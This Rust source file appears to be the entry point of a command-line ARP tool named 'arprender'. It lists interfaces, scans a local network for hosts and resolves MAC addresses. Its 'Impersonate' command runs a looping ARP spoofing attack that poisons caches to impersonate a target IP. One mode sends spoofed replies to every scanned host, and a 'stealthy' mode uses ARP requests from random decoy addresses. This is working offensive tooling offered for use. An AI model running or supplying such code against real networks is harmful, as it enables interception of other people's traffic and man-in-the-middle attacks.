use std::time::{Duration, Instant};

use clap::Parser;
use cli::{Args, Commands};

use arprender::{arp_scan, resolve_mac, send_arp_reply, send_arp_request};
use tabled::settings::{Alignment, Settings};
use utils::{is_timer_expired, random_ip_in_network};

pub mod arprender;
pub mod cli;
#[macro_use]
pub mod utils;

fn main() {
    let args = Args::parse();

    match args.cmd {
        Commands::Interfaces => {
            let interfaces = arprender::nic::get_interfaces();

            // Prepare pretty formatting
            let table_config = Settings::default().with(Alignment::center());
            let mut interfaces_table = tabled::builder::Builder::new();
            interfaces_table.push_record(["Name", "MAC Address", "IP Address"]);

            for interface in interfaces {
                let mac_str = match interface.mac() {
                    Some(mac) => mac.to_string(),
                    None => "None".to_string(),
                };
                let ip_str = match interface.ipv4_address() {
                    Some(ip) => ip.to_string(),
                    None => "None".to_string(),
                };

                interfaces_table.push_record([interface.name(), &mac_str, &ip_str]);
            }

            println!(
                "{}",
                interfaces_table.build().with(table_config).to_string()
            );
        }
        Commands::Scan {
            interface: interface_name,
        } => match arprender::nic::get_interface_by_name(&interface_name) {
            Ok(interface) => match arp_scan(&interface, Duration::from_secs(5)) {
                Ok(hosts) => {
                    // Construct output table
                    let table_config = Settings::default().with(Alignment::center());
                    let mut interfaces_table = tabled::builder::Builder::new();
                    interfaces_table.push_record(["IP Address", "MAC Address"]);

                    for host in hosts {
                        interfaces_table.push_record([host.0.to_string(), host.1.to_string()]);
                    }

                    // Print output
                    println!("Identified hosts:");
                    println!(
                        "{}",
                        interfaces_table.build().with(table_config).to_string()
                    );
                }
                Err(err) => {
                    println!("{}", err.to_string());
                }
            },
            Err(err) => {
                println!("{}", err.to_string());
                std::process::exit(1);
            }
        },
        Commands::Resolve { interface, address } => {
            match arprender::nic::get_interface_by_name(&interface) {
                Ok(interface) => match resolve_mac(&interface, address, Duration::from_secs(10)) {
                    Ok(mac) => match mac {
                        Some(mac) => {
                            println!("IP {} has MAC address {}", address, mac);
                        }
                        None => {
                            println!("Failed to resolve address!");
                        }
                    },
                    Err(err) => {
                        println!("{}", err.to_string());
                        std::process::exit(1);
                    }
                },
                Err(err) => {
                    println!("{}", err.to_string());
                    std::process::exit(1);
                }
            }
        }
        Commands::Impersonate {
            target,
            interface,
            stealthy,
            period,
        } => {
            match arprender::nic::get_interface_by_name(&interface) {
                Ok(interface) => {
                    let period = Duration::from_secs(period.into());

                    if stealthy {
                        let Some(net) = interface.network() else {
                            eprintln!("Interface not connected to a network.");
                            std::process::exit(1);
                        };

                        // Generate a random IP in the range of the network to make the ARP request look legitimate.
                        let attack = || {
                            let decoy_ip = loop {
                                let random_ip = random_ip_in_network(net);

                                // Ensure that the random IP is different from the target in order to prevent any interference from a potential ARP response from the target.
                                if random_ip.ne(&target) {
                                    break random_ip;
                                }
                            };

                            send_arp_request(&interface, decoy_ip, None, Some(target)).unwrap();
                        };

                        loop_attack!(attack, period);
                    } else {
                        // Perform an ARP scan to detect the available hosts on the network.
                        println!("Launching ARP scan using timeout {} seconds...", 10);
                        match arp_scan(&interface, Duration::from_secs(10)) {
                            Ok(hosts) => {
                                // Construct output table
                                let table_config = Settings::default().with(Alignment::center());
                                let mut interfaces_table = tabled::builder::Builder::new();
                                interfaces_table.push_record(["IP Address", "MAC Address"]);

                                for host in &hosts {
                                    interfaces_table
                                        .push_record([host.0.to_string(), host.1.to_string()]);
                                }

                                // Print output
                                println!("Identified hosts:");
                                println!(
                                    "{}",
                                    interfaces_table.build().with(table_config).to_string()
                                );

                                println!("Launching ARP impersonation attack...");
                                let attack = || {
                                    for host in &hosts {
                                        send_arp_reply(
                                            &interface,
                                            host.1,
                                            host.0,
                                            None,
                                            Some(target),
                                        )
                                        .unwrap();
                                    }
                                };

                                loop_attack!(attack, period);
                            }
                            Err(err) => {
                                eprintln!("{}", err.to_string());
                                std::process::exit(1);
                            }
                        }
                    }
                }
                Err(err) => {
                    println!("{}", err.to_string());
                    std::process::exit(1);
                }
            }
        }
    }
}
